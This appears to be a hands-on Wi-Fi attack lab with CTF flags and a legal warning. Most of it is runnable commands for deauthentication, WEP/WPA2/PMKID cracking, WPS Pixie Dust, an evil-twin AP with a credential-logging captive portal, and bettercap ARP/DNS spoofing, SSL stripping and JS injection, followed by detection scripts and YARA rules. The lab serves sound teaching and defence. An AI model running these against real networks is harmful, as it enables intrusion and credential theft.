## Legal Authorisation Statement

> **You must only perform these attacks against networks and devices you own or have written permission to test. Performing these attacks against any network without explicit authorisation is illegal in every jurisdiction: including Pakistan (PECA 2016), UK (Computer Misuse Act 1990) and internationally (CFAA, Budapest Convention). This lab uses your own home router and controlled VMs only.**

Set up a dedicated lab access point (your home router or a second cheap TP-Link router purchased for the purpose). Never run these against public Wi-Fi, neighbour networks or institutional infrastructure.

## Hardware Requirements

> Standard laptop built-in WiFi cards do NOT support monitor mode or packet injection. An external USB adapter is mandatory.

### Required Hardware

| Item | Recommended Model | Chipset | PKR Price (Approx) |
|---|---|---|---|
| **USB WiFi Adapter** | TP-Link TL-WN722N **v1 ONLY** | Atheros AR9271 | 1,200–2,500 |

<div align="center">
  <img src="https://static.webx.pk/files/2603/Images/tl-wn722n-eu-3.0-02-large-1506586260889r-2603-2485961-101125024959066.webp" 
       alt="Wifi Dongul" 
       width="600"/>
</div>

### Critical Warning: TP-Link WN722N Version Check

The WN722N comes in three hardware revisions. **Only v1 is usable for this lab.**

```
v1 (Atheros AR9271): FULL monitor mode + packet injection: BUY THIS
v2 (Realtek RTL8188EUS): monitor mode limited, NO reliable injection: AVOID
v3 (Realtek RTL8188EUS): same as v2: AVOID
```

**How to check version before buying:** Look at the sticker on the bottom of the box. It reads `Ver 1.0`, `Ver 2.0` or `Ver 3.0`. If the seller cannot confirm v1, do not buy.

**Alternative chipsets that work (if WN722N v1 unavailable):**

| Adapter | Chipset | PKR Estimate |
|---|---|---|
| Alfa AWUS036NHA (older stock) | Atheros AR9271 | 1,800–2,500 (slightly over budget but best option) |
| Generic RT3070 adapter | Ralink RT3070 | 800–1,200 |
| Panda PAU05 | Ralink RT3070L | 1,500–2,000 |

---

## Environment Setup
<div align="center">
  <img src="https://github.com/uzairshahidgithub/WiFi-Security-Honeypots-Network-Surveillance-Lab/blob/main/Topology%20Lab%20Diagram.png?raw=true" 
       alt="Daigram Lab" 
       width="600"/>
</div>

All "victim" traffic is your own controlled devices. Never involve third-party devices.

### Kali Environment Preparation

```bash
# Update system
sudo apt update && sudo apt full-upgrade -y

# Install wireless tools
sudo apt install -y aircrack-ng airodump-ng aireplay-ng airbase-ng \
  reaver bully wash hostapd dnsmasq bettercap wireshark tshark \
  hashcat john crunch cewl mdk4 hcxtools hcxdumptool net-tools \
  macchanger nmap arp-scan ettercap-graphical sslstrip python3-pip

# Install additional Python tools
pip3 install scapy impacket

# Confirm USB adapter is recognised
lsusb | grep -i "atheros\|AR9271\|ralink\|RT3070"
iwconfig
```

### Verify Adapter Supports Monitor Mode

```bash
# Check adapter name (typically wlan0 or wlan1)
iw dev

# Check capabilities
iw list | grep -A 10 "Supported interface modes"
# Must show: * monitor

# Check injection capability (will show % packet loss)
sudo airmon-ng check
sudo airmon-ng check kill   # Kill interfering processes
sudo airmon-ng start wlan0  # Creates wlan0mon interface
```

---

## Phase 1: Wireless Reconnaissance & Packet Sniffing

### Task 1.1: Enable Monitor Mode

```bash
# Kill conflicting processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode active
iwconfig wlan0mon
# Should show: Mode:Monitor

# Alternative manual method
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
iwconfig wlan0
```

---

### Task 1.2: Passive Network Discovery (airodump-ng)

```bash
# Scan all channels: identify your target AP
sudo airodump-ng wlan0mon

# Output columns explained:
# BSSID   : MAC address of the access point
# PWR     : Signal strength (closer to 0 = stronger)
# Beacons : Beacon frames transmitted
# #Data   : Data frames captured
# CH      : Operating channel
# ENC     : Encryption type (WEP/WPA/WPA2)
# CIPHER  : Cipher used (CCMP/TKIP)
# AUTH    : Authentication (PSK/MGT)
# ESSID   : Network name (SSID)

# Press Ctrl+C when you have identified your target AP
# Note down: TARGET_BSSID and CHANNEL
```

```bash
# Lock onto your specific target AP
TARGET_BSSID="AA:BB:CC:DD:EE:FF"   # Replace with your router's MAC
TARGET_CHANNEL="6"                   # Replace with your router's channel

sudo airodump-ng \
  --bssid $TARGET_BSSID \
  --channel $TARGET_CHANNEL \
  --write ~/ghost_signal/captures/target_scan \
  wlan0mon

# This creates:
# target_scan-01.cap : raw capture file
# target_scan-01.csv : parsed AP/client data
# target_scan-01.kismet.netxml: Kismet format
```

---

### Task 1.3: Target Packet Sniffing (Wireshark + tcpdump)

```bash
# Capture all traffic on target channel to file
sudo tcpdump -i wlan0mon \
  -w ~/ghost_signal/captures/raw_traffic.pcap \
  --buffer-size 65536

# Parallel: Open Wireshark for live visual analysis
sudo wireshark -i wlan0mon -k &
```

**Wireshark Filters for WiFi Analysis:**

```
# Show only beacon frames (AP advertisements)
wlan.fc.type_subtype == 0x08

# Show only probe requests (clients searching for networks)
wlan.fc.type_subtype == 0x04

# Show only authentication frames
wlan.fc.type_subtype == 0x0b

# Show only deauthentication frames
wlan.fc.type_subtype == 0x0c

# Show data frames from specific AP
wlan.bssid == aa:bb:cc:dd:ee:ff

# Show EAPOL frames (WPA handshake)
eapol

# Show ARP traffic
arp
```

**Document the following from your capture:**

1. How many clients are connected to your target AP?
2. What MAC addresses are the clients using?
3. What is the beacon interval of your AP?
4. Can you see any probe requests from clients looking for other networks?

> **Flag 1:** Run the command below against your PCAP and submit the output: `CIPHER{<beacon_count>_beacons_captured_<AP_name>}`

```bash
# Count beacon frames in capture
tshark -r ~/ghost_signal/captures/raw_traffic.pcap \
  -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.sa -e wlan_mgt.ssid | sort | uniq -c
```

---

## Phase 2: Deauthentication Attack

### Background

A deauthentication (deauth) attack sends forged 802.11 management frames to a client, impersonating the AP. The client believes the AP has disconnected it and attempts to reconnect: creating a window to capture the WPA handshake or force the client onto your rogue AP.

**Why it works:** 802.11 management frames (including deauth) are unauthenticated in WPA2-Personal. WPA3 (802.11w) introduces Protected Management Frames (PMF) which mitigates this. WPA2 networks without PMF enabled are fully vulnerable.

MITRE: **T1499: Endpoint Denial of Service** / **TA0001: Initial Access** (forcing reconnect)

### Task 2.1: Targeted Deauthentication

```bash
TARGET_BSSID="AA:BB:CC:DD:EE:FF"    # Your router MAC
CLIENT_MAC="11:22:33:44:55:66"       # Your victim device MAC (from airodump scan)
TARGET_CHANNEL="6"

# Lock adapter to target channel
sudo iwconfig wlan0mon channel $TARGET_CHANNEL

# Send 10 deauth frames to specific client (targeted)
sudo aireplay-ng \
  --deauth 10 \
  -a $TARGET_BSSID \
  -c $CLIENT_MAC \
  wlan0mon

# Send broadcast deauth (disconnects ALL clients from AP)
sudo aireplay-ng \
  --deauth 10 \
  -a $TARGET_BSSID \
  wlan0mon
```

```bash
# Confirm deauth visible in Wireshark using filter:
# wlan.fc.type_subtype == 0x0c

# Use mdk4 for more sophisticated deauth (beacon flooding / auth DoS)
sudo mdk4 wlan0mon d -B $TARGET_BSSID
```

**Observe and document:**

1. Does your victim device disconnect from the WiFi?
2. How many frames does it take before disconnection occurs?
3. Does the device automatically reconnect?
4. Can you see the reconnection (association frames) in Wireshark?

---

## Phase 3: WEP Cracking (Legacy Protocol)

### Background

WEP (Wired Equivalent Privacy, 1997) is cryptographically broken. Its RC4 keystream reuse vulnerability means sufficient IVs (Initialisation Vectors) in captured traffic allow statistical key recovery in minutes. No modern AP should use WEP: but legacy IoT devices, old routers and some industrial equipment still do.

**Why we teach it:** Understanding why WEP failed is prerequisite to understanding why WPA2-CCMP is designed the way it is.

### Task 3.1: Set Up WEP Target

If your router supports WEP mode, temporarily configure it. Otherwise use a virtualised AP:

```bash
# Create a software WEP AP using hostapd for testing
sudo apt install hostapd -y

cat > /tmp/wep_lab.conf << 'EOF'
interface=wlan0mon
ssid=LAB_WEP_TARGET
channel=6
hw_mode=g
wep_default_key=0
wep_key0=AABBCCDDEEFF   # 6-byte hex WEP key for lab
auth_algs=1
EOF

# Note: Running WEP AP on same adapter as attack is complex
# Use a second USB adapter or a physical router set to WEP for this task
```

### Task 3.2: Crack WEP

```bash
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"

# Step 1: Start capture locked to WEP target
sudo airodump-ng \
  --bssid $TARGET_BSSID \
  --channel $TARGET_CHANNEL \
  --write ~/ghost_signal/wep/wep_capture \
  wlan0mon &

# Step 2: Fake authentication (associate with AP without knowing key)
sudo aireplay-ng \
  --fakeauth 0 \
  -a $TARGET_BSSID \
  -h $(ip link show wlan0mon | awk '/ether/{print $2}') \
  wlan0mon

# Step 3: ARP replay attack: accelerate IV generation
sudo aireplay-ng \
  --arpreplay \
  -b $TARGET_BSSID \
  -h $(ip link show wlan0mon | awk '/ether/{print $2}') \
  wlan0mon

# Watch airodump: #Data count increasing rapidly = good
# Need ~50,000-100,000 IVs for 64-bit WEP, ~200,000+ for 128-bit

# Step 4: Crack the key (run while still capturing)
aircrack-ng ~/ghost_signal/wep/wep_capture-01.cap
```

**Expected output when key is found:**

```
KEY FOUND! [ AA:BB:CC:DD:EE:FF ]
Decrypted correctly: 100%
```

> **Key concept:** WEP uses a 24-bit IV space (16.7 million values). With enough traffic, IV collisions become statistically certain, exposing the keystream. This is the Fluhrer-Mantin-Shamir (FMS) attack: published 2001, still effective today against WEP.

---

## Phase 4: WPA/WPA2: Handshake Capture

### Background

WPA2-PSK security depends entirely on the strength of the pre-shared key. The 4-way EAPOL handshake: captured during a client's connection: contains a verifiable hash of the password (PBKDF2-SHA1, 4096 iterations). Offline dictionary/brute-force attack against this hash is the primary attack vector.

**WPA2 is NOT broken cryptographically.** The weakness is the human element: weak passwords and the offline cracking window created by the handshake capture.

### Task 4.1: Capture WPA2 4-Way Handshake

```bash
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
mkdir -p ~/ghost_signal/wpa

# Step 1: Start targeted capture
sudo airodump-ng \
  --bssid $TARGET_BSSID \
  --channel $TARGET_CHANNEL \
  --write ~/ghost_signal/wpa/wpa_capture \
  wlan0mon

# Step 2: In a second terminal: force reconnect via deauth
sudo aireplay-ng \
  --deauth 5 \
  -a $TARGET_BSSID \
  wlan0mon

# Watch top-right corner of airodump for:
# WPA handshake: AA:BB:CC:DD:EE:FF
# This confirms capture successful

# Verify handshake in capture file
aircrack-ng ~/ghost_signal/wpa/wpa_capture-01.cap
# Should say: "1 handshake": not "No valid WPA handshakes"
```

```bash
# Alternative: hcxdumptool (more modern, captures PMKIDs too)
sudo hcxdumptool \
  -i wlan0mon \
  --enable_status=1 \
  -o ~/ghost_signal/wpa/hcx_capture.pcapng \
  --filterlist_ap=/tmp/target_list.txt \
  --filtermode=2

# Convert hcxdumptool capture to hashcat format
hcxpcapngtool \
  -o ~/ghost_signal/wpa/hash_for_hashcat.hc22000 \
  ~/ghost_signal/wpa/hcx_capture.pcapng
```

---

### Task 4.2: PMKID Attack (No Client Required)

The PMKID attack (Jens Steube, 2018) allows handshake-equivalent cracking **without any client connected.** The PMKID is derived from: `HMAC-SHA1(PMK, "PMK Name" || AP_MAC || Client_MAC)` and is broadcast in the first EAPOL frame from the AP itself.

```bash
# Capture PMKID directly from AP (no client deauth needed)
sudo hcxdumptool \
  -i wlan0mon \
  --enable_status=1 \
  -o ~/ghost_signal/wpa/pmkid_capture.pcapng

# Convert to hashcat 22000 format
hcxpcapngtool \
  -o ~/ghost_signal/wpa/pmkid_hash.hc22000 \
  ~/ghost_signal/wpa/pmkid_capture.pcapng

# Inspect what was captured
hcxpcapngtool --info ~/ghost_signal/wpa/pmkid_capture.pcapng
```

---

## Phase 5: WPS Exploitation

### Background

WPS (Wi-Fi Protected Setup, 2006) was designed to simplify device pairing. Its PIN-based authentication uses an 8-digit PIN verified in two 4-digit halves independently: reducing the keyspace from 10^8 (100 million) to 10^4 + 10^3 = 11,000 combinations. The Pixie Dust attack exploits weak random number generation in some router chipsets: recovering the PIN in seconds.

### Task 5.1: Scan for WPS-Enabled APs

```bash
# Identify WPS-enabled APs and their WPS version/lock status
sudo wash -i wlan0mon

# Output columns:
# BSSID        : AP MAC
# Ch           : Channel
# dBm          : Signal strength
# WPS          : WPS version (1.0 / 2.0)
# Lck          : WPS locked? (Yes = brute force will fail)
# ESSID        : Network name
```

**Only proceed if `Lck` shows `No`: WPS locked APs reject repeated PIN attempts.**

---

### Task 5.2: Reaver: WPS PIN Brute Force

```bash
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"

# Standard WPS PIN brute force
sudo reaver \
  -i wlan0mon \
  -b $TARGET_BSSID \
  -c $TARGET_CHANNEL \
  -vvv \
  -K 1

# Flags explained:
# -vvv     verbose output
# -K 1     enable Pixie Dust attack first (faster: recovers PIN in seconds on vulnerable routers)
# -d 1     delay 1 second between attempts (avoid rate limiting)
# -r 3:15  3 attempts then wait 15 seconds (avoid lockout)

# If Pixie Dust fails, fall back to PIN brute force
sudo reaver \
  -i wlan0mon \
  -b $TARGET_BSSID \
  -c $TARGET_CHANNEL \
  -vvv \
  -d 2 \
  -r 3:60
```

---

### Task 5.3: Bully: Alternative WPS Tool

```bash
# bully handles some edge cases reaver does not
sudo bully \
  -b $TARGET_BSSID \
  -c $TARGET_CHANNEL \
  -d \
  -v 3 \
  wlan0mon

# Pixie Dust mode
sudo bully \
  -b $TARGET_BSSID \
  -c $TARGET_CHANNEL \
  -d \
  -F \
  wlan0mon
```

**WPS Pixie Dust: Why it Works:**

Some router chipsets (Ralink, Broadcom, some Realtek) use weak or static nonces in the WPS M1/M2 messages. `pixiewps` (called internally by reaver -K) derives the PIN from these weak nonces without any brute force. Affected routers reveal their WPS PIN: and therefore the WPA2 password: within 5 seconds.

```bash
# Check if your router is Pixie Dust vulnerable
sudo reaver -i wlan0mon -b $TARGET_BSSID -c $TARGET_CHANNEL -K 1 -vvv 2>&1 | grep -i "pixie"
```

> **Flag 2:** Once WPS PIN is recovered: `CIPHER{wps_pin_<8_digit_pin>_recovered_pixiedust}`

---

## Phase 6: Wordlist Creation & WPA2 Cracking

### Task 6.1: Wordlist Generation with crunch

```bash
mkdir -p ~/ghost_signal/wordlists

# Generate all 8-char lowercase alpha strings (demonstration only: massive file)
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o ~/ghost_signal/wordlists/alpha8.txt

# More realistic: Pakistani common password patterns
# Pattern: City+Year (Lahore2023, Karachi2024)
crunch 10 12 -t Lahore@@## -o ~/ghost_signal/wordlists/pk_city_year.txt
# @ = lowercase, # = number, ^ = special char, % = uppercase

# Numeric PIN patterns (phone/ATM style)
crunch 8 8 0123456789 -o ~/ghost_signal/wordlists/numeric8.txt

# Combine crunch patterns
crunch 6 10 Pakistan -o ~/ghost_signal/wordlists/pak_variations.txt
```

### Task 6.2: CEWL (Web-Based Wordlist from Target Website)

```bash
# Scrape a website and build a wordlist from its vocabulary
# Use your own website, a lab site or example.com
cewl https://example.com \
  -d 3 \              # Depth: follow links 3 levels deep
  -m 6 \              # Minimum word length: 6 chars
  -w ~/ghost_signal/wordlists/cewl_output.txt \
  --with-numbers       # Include words containing numbers

cat ~/ghost_signal/wordlists/cewl_output.txt | wc -l
```

### Task 6.3: Hashcat Rule-Based Mutation

```bash
# Use rockyou.txt as base (pre-installed on Kali)
ls /usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# Apply hashcat best64 rules to expand coverage
hashcat \
  --stdout \
  -r /usr/share/hashcat/rules/best64.rule \
  /usr/share/wordlists/rockyou.txt \
  > ~/ghost_signal/wordlists/rockyou_mutated.txt

wc -l ~/ghost_signal/wordlists/rockyou_mutated.txt
```

### Task 6.4: Crack WPA2 with aircrack-ng

```bash
# Method 1: aircrack-ng (CPU-based: slower but universal)
aircrack-ng \
  -w /usr/share/wordlists/rockyou.txt \
  -b $TARGET_BSSID \
  ~/ghost_signal/wpa/wpa_capture-01.cap

# Method 2: hashcat (GPU-accelerated: significantly faster if GPU available)
# First convert .cap to hashcat format
hcxpcapngtool \
  -o ~/ghost_signal/wpa/crack_me.hc22000 \
  ~/ghost_signal/wpa/wpa_capture-01.cap

# Crack with hashcat mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
hashcat \
  -m 22000 \
  ~/ghost_signal/wpa/crack_me.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --status \
  --status-timer 10

# GPU benchmark (see expected speeds)
hashcat -m 22000 -b
```

**Realistic cracking speeds on common hardware:**

| Hardware | WPA2 Hashes/Second |
|---|---|
| Intel Core i5 (CPU only) | ~5,000–15,000 H/s |
| Nvidia GTX 1660 | ~350,000 H/s |
| Nvidia RTX 3060 | ~700,000 H/s |
| Nvidia RTX 4090 | ~2,800,000 H/s |

**Key takeaway:** A 10-char random password at 350,000 H/s against rockyou.txt either cracks immediately (if in the list) or never (if truly random). Password length and randomness are the real defences: not WPA2 itself.

> **Flag 3:** After cracking your own AP password: `CIPHER{wpa2_cracked_<first_4_chars_of_password>_aircrack}`

---

## Phase 7: Honeypots for Attacker Campaigns

### Background

A WiFi honeypot is a rogue access point designed to lure targets into connecting. Once connected, all victim traffic flows through the attacker's machine: enabling credential harvesting, MITM injection, session hijacking and malware delivery.

**Defensive use:** Blue teamers deploy honeypot APs on corporate networks to detect rogue WiFi attacks: any connection to a known-evil SSID triggers an alert.

### Task 7.1: Evil Twin / Rogue AP with hostapd + dnsmasq

```bash
mkdir -p ~/ghost_signal/honeypot

# Step 1: Create hostapd config (your rogue AP)
cat > ~/ghost_signal/honeypot/rogue_ap.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=FreeWifi_LabTest
channel=6
hw_mode=g
ignore_broadcast_ssid=0
EOF

# Step 2: Create dnsmasq config (DHCP + DNS server)
cat > ~/ghost_signal/honeypot/dnsmasq.conf << 'EOF'
interface=wlan0mon
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

# Step 3: Configure honeypot interface
sudo ip addr add 10.0.0.1/24 dev wlan0mon
sudo ip link set wlan0mon up

# Step 4: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Step 5: NAT rule to route victim traffic to internet (optional: captive portal works without)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0mon -m state --state RELATED,ESTABLISHED -j ACCEPT

# Step 6: Start services
sudo hostapd ~/ghost_signal/honeypot/rogue_ap.conf &
sudo dnsmasq -C ~/ghost_signal/honeypot/dnsmasq.conf &

echo "Rogue AP active: FreeWifi_LabTest on channel 6"
echo "Victim DHCP range: 10.0.0.10-100"
```

---

### Task 7.2: Captive Portal Honeypot

```bash
# Step 1: Install lighttpd for captive portal web server
sudo apt install lighttpd -y

# Step 2: Create fake login portal (simulates hotel/café WiFi login)
mkdir -p /var/www/html/portal

cat > /var/www/html/portal/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Free WiFi: Login</title></head>
<body style="font-family:Arial; text-align:center; padding:50px; background:#f0f0f0;">
  <h2>Welcome to Free Public WiFi</h2>
  <p>Please login to continue browsing</p>
  <form method="POST" action="/capture.php">
    <input type="text" name="username" placeholder="Email / Username" style="padding:10px; width:250px;"><br><br>
    <input type="password" name="password" placeholder="Password" style="padding:10px; width:250px;"><br><br>
    <button type="submit" style="padding:10px 30px; background:#0066cc; color:white; border:none;">Connect</button>
  </form>
</body>
</html>
EOF

# Step 3: Credential capture script
cat > /var/www/html/portal/capture.php << 'EOF'
<?php
$logfile = '/tmp/captured_creds.log';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user = htmlspecialchars($_POST['username'] ?? '');
$pass = htmlspecialchars($_POST['password'] ?? '');
file_put_contents($logfile, "[$timestamp] IP:$ip USER:$user PASS:$pass\n", FILE_APPEND);
header("Location: https://google.com");
?>
EOF

# Step 4: DNS redirect all queries to captive portal
echo "address=/#/10.0.0.1" >> ~/ghost_signal/honeypot/dnsmasq.conf

sudo systemctl restart lighttpd
sudo systemctl restart dnsmasq

echo "Captive portal active at: http://10.0.0.1/portal/"
echo "Captured credentials will log to: /tmp/captured_creds.log"

# Step 5: Monitor captured credentials in real time
tail -f /tmp/captured_creds.log
```

> **Flag 4:** After your victim VM connects and submits test credentials: `CIPHER{honeypot_credential_captured_<username_submitted>}`

---

## Phase 8: MITM Attacks with Bettercap

### Background

Bettercap is the most capable MITM framework available. It combines ARP spoofing, DNS spoofing, HTTP/HTTPS interception, credential sniffing and JavaScript injection into a single interactive REPL.

### Task 8.1: Install and Launch Bettercap

```bash
# Install
sudo apt install -y bettercap
sudo bettercap -v

# Update module capabilities database
sudo bettercap -eval "caplets.update; ui.update; q"

# Launch Bettercap against your local interface
sudo bettercap -iface eth0   # or wlan0mon if on wireless

# Bettercap interactive REPL opens
```

---

### Task 8.2: ARP Spoofing

ARP (Address Resolution Protocol) has no authentication: any host can broadcast false MAC-to-IP mappings. ARP poisoning tells the victim "the gateway is at my MAC" and tells the gateway "the victim is at my MAC": all traffic flows through the attacker.

```bash
# Inside bettercap REPL:

# Show discovered hosts on your network
net.probe on
net.show

# Target your victim VM IP
set arp.spoof.targets 192.168.1.X    # Your victim VM IP

# Enable full duplex spoofing (both directions)
set arp.spoof.fullduplex true
set arp.spoof.internal true

# Start ARP spoofing
arp.spoof on

# Verify you are now in the traffic path
net.show
# Your machine should show as MITM between victim and gateway
```

```bash
# Verify ARP poisoning worked on VICTIM machine
# On victim VM: run this and check that the gateway MAC now matches your attacker MAC
arp -a
```

---

### Task 8.3: Passive Traffic Sniffing via Bettercap

```bash
# Inside bettercap REPL (after ARP spoof is active):

# Enable network sniffer
net.sniff on

# Bettercap auto-parses and displays:
# - HTTP POST data (form submissions)
# - FTP/Telnet/POP3 credentials (cleartext protocols)
# - Cookie headers
# - DNS queries
# - User-Agent strings
```

```bash
# Simultaneously: capture raw PCAP for offline analysis
set net.sniff.output ~/ghost_signal/mitm/mitm_capture.pcap
net.sniff on
```

**From your victim VM:** Browse to any HTTP (not HTTPS) website and submit a form. Bettercap will display the POST data in real time in the REPL.

---

### Task 8.4: HTTPS Bypass: SSL Stripping

SSL stripping downgrades HTTPS connections to HTTP when the user navigates via an HTTP link (before HTTPS redirect). Bettercap's `https.proxy` + `hstshijack` module handles this automatically.

```bash
# Inside bettercap REPL (arp.spoof must be active):

# Load hstshijack caplet (downgrades HTTPS to HTTP for non-HSTS sites)
caplets.show
set hstshijack.log ~/ghost_signal/mitm/hstshijack.log
set hstshijack.targets *

# Enable HTTP proxy (intercepts and modifies HTTP traffic)
set http.proxy.sslstrip true
http.proxy on

# Enable HTTPS proxy with certificate spoofing
https.proxy on

# Run full MITM caplet
# This applies: ARP spoof + DNS spoof + HTTP/HTTPS proxy + credential capture
set net.sniff.verbose true
net.sniff on
```

```bash
# Alternative: standalone hstshijack module
sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
```

> **Important technical note:** HSTS (HTTP Strict Transport Security) preloading protects major sites (Google, Facebook, banking) from SSL stripping: browsers refuse HTTP connections to HSTS-pinned domains regardless of what a proxy returns. SSL stripping only works on:
> - Sites not in the HSTS preload list
> - Sites the victim has never visited before (no cached HSTS policy)
> - Sites with HTTP pages that redirect to HTTPS (the redirect is the attack window)

---

### Task 8.5: DNS Spoofing

```bash
# Inside bettercap REPL:

# Redirect specific domain to your machine (for phishing demo)
set dns.spoof.domains lab-test-site.com
set dns.spoof.address 10.0.0.1   # Your attacker IP serving fake page

dns.spoof on

# All victim DNS queries for lab-test-site.com now resolve to your machine
```

```bash
# Verify DNS spoof working from victim machine
nslookup lab-test-site.com   # Should return 10.0.0.1 (your attacker IP)
```

---

### Task 8.6: JavaScript Injection via Bettercap

```bash
# Inside bettercap REPL:

# Inject custom JS into every HTTP page victim visits
set http.proxy.script ~/ghost_signal/mitm/inject.js
http.proxy on
```

Create `~/ghost_signal/mitm/inject.js`:

```javascript
// Bettercap JS injection: fires on every HTTP page load
// This demonstrates how an attacker intercepts and modifies web content in transit

function onLoad() {
    console.log("[GHOST SIGNAL] Injection active on: " + document.location.href);
}

function onResponse(req, res) {
    // Only inject into HTML pages
    if (res.ContentType.includes("text/html")) {
        var body = res.ReadBody();
        // Append visible banner (proof of injection: educational demo only)
        body = body.replace(
            "</body>",
            '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;' +
            'font-size:18px;text-align:center;z-index:9999;padding:8px;">' +
            '[CIPHER LAB] MITM INJECTION ACTIVE: GHOST SIGNAL</div></body>'
        );
        res.Body = body;
    }
}
```

> **Flag 5:** Capture a screenshot of your victim VM's browser showing the red injection banner. Record: `CIPHER{bettercap_js_injection_confirmed_on_<site_visited>}`

---

## Phase 9: Detection & Defence

### Task 9.1: Detect Deauth Attacks

```bash
# Monitor for deauth frames targeting your network
sudo airodump-ng --bssid $TARGET_BSSID wlan0mon | grep "Deauthentication"

# Wireshark filter for deauth storm detection
# wlan.fc.type_subtype == 0x0c and wlan.fixed.reason_code != 0

# Script to alert on deauth floods
sudo tshark -i wlan0mon \
  -Y "wlan.fc.type_subtype == 0x0c" \
  -T fields \
  -e wlan.sa \
  -e wlan.da \
  -e wlan.bssid | awk '{count[$1]++} count[$1]>10{print "ALERT: Deauth flood from " $1}'
```

---

### Task 9.2: Detect ARP Spoofing

```bash
# Static ARP inspection: detect gateway MAC change
GATEWAY_IP="192.168.1.1"
REAL_GATEWAY_MAC="your:real:gateway:mac"   # Note this from clean state

# Monitor ARP table for changes
watch -n 2 "arp -n | grep $GATEWAY_IP"

# Alert if gateway MAC changes
arp -n | grep $GATEWAY_IP | awk '{print $3}' | while read mac; do
    if [ "$mac" != "$REAL_GATEWAY_MAC" ]; then
        echo "ALERT: ARP SPOOFING DETECTED: Gateway MAC changed to $mac"
    fi
done

# Use arp-scan for network-wide ARP anomaly detection
sudo arp-scan -l | sort -k1,1 | awk 'seen[$1]++{print "DUPLICATE IP: " $1 ": Possible ARP spoof"}'
```

---

### Task 9.3: Detect Rogue APs

```bash
# Scan for APs with your SSID but different BSSID (evil twin indicator)
sudo airodump-ng wlan0mon | grep "YourSSID"
# If two rows appear with the same ESSID but different BSSID: rogue AP present

# Use wash to detect unexpected WPS advertisements
sudo wash -i wlan0mon

# Enterprise detection: 802.11r/k/v probe analysis for rogue AP signatures
sudo tshark -i wlan0mon \
  -Y "wlan.fc.type_subtype == 0x08" \
  -T fields \
  -e wlan.sa \
  -e wlan_mgt.ssid \
  -e wlan_mgt.rsn.capabilities | sort -k2
```

---

### Task 9.4: YARA Rule for WiFi Attack Artefacts

```yara
/*
   YARA Rule: Detect artefacts from WiFi attack tools
   Lab: GHOST SIGNAL
   MITRE: T1040, T1557.002, T1110.002
*/

rule aircrack_capture_file
{
    meta:
        description = "Detects aircrack-ng .cap capture files: possible WiFi attack artefact"
        author      = "CIPHER Lab"
        mitre       = "T1040"

    strings:
        $pcap_magic_le   = { D4 C3 B2 A1 }   // pcap little-endian magic
        $pcap_magic_be   = { A1 B2 C3 D4 }   // pcap big-endian magic
        $eapol_marker    = { 88 8E }           // EAPOL ethertype
        $wpa_handshake   = "WPA handshake"  ascii nocase

    condition:
        ($pcap_magic_le at 0 or $pcap_magic_be at 0)
        and $eapol_marker
}


rule bettercap_js_injection_script
{
    meta:
        description = "Detects bettercap-style JS injection scripts on disk"
        author      = "CIPHER Lab"
        mitre       = "T1557"

    strings:
        $bettercap_fn1   = "onResponse" ascii
        $bettercap_fn2   = "ReadBody"   ascii
        $bettercap_fn3   = "res.Body"   ascii
        $proxy_comment   = "bettercap"  ascii nocase

    condition:
        2 of them
}
```

```bash
# Save and test
yara ~/ghost_signal/detection/wifi_attack.yar ~/ghost_signal/
```

---

## Independent Challenge (30 Minutes)

> No hints. Work independently. Submit all flags.

1. Your instructor has set up a WPA2-protected AP called `GHOST_CHALLENGE` on channel 11. Capture the handshake, crack it using rockyou.txt, and submit the recovered password.
2. A rogue AP is broadcasting on the same channel as your legitimate AP with a similar SSID. Identify it using airodump-ng and document: BSSID, channel difference and signal strength.
3. Using bettercap, perform ARP spoofing against your victim VM and capture one set of HTTP POST credentials. Submit the username captured.

| Challenge Flag | Value | Method |
|---|---|---|
| C1 | `CIPHER{wpa2_challenge_<password>}` | aircrack-ng |
| C2 | `CIPHER{rogue_ap_bssid_<last4mac>}` | airodump-ng |
| C3 | `CIPHER{mitm_captured_user_<username>}` | bettercap |

---

## Deliverables

| # | Item | Phase |
|---|---|---|
| 1 | airodump-ng scan screenshot showing target AP details | Phase 1 |
| 2 | Wireshark screenshot: EAPOL frames visible | Phase 1 |
| 3 | Deauth attack terminal output + victim disconnection confirmation | Phase 2 |
| 4 | WEP key recovered: aircrack-ng output | Phase 3 |
| 5 | WPA2 handshake capture: airodump "WPA handshake" confirmation | Phase 4 |
| 6 | PMKID capture: hcxdumptool output | Phase 4 |
| 7 | WPS PIN recovered: reaver/bully output | Phase 5 |
| 8 | WPA2 password cracked: aircrack-ng/hashcat output | Phase 6 |
| 9 | Rogue AP running: hostapd + captured credential log | Phase 7 |
| 10 | Bettercap ARP spoof active: net.show screenshot | Phase 8 |
| 11 | JS injection banner visible in victim browser | Phase 8 |
| 12 | ARP spoof detection script output | Phase 9 |
| 13 | YARA rule test results | Phase 9 |
| 14 | All 3 challenge flags | Challenge |

All screenshots: full desktop visible, terminal hostname shown, no crops.

---

## Grading Rubric

| Section | Marks |
|---|---|
| Reconnaissance & Sniffing (Phase 1) | 10 |
| Deauth Attack (Phase 2) | 10 |
| WEP Crack (Phase 3) | 10 |
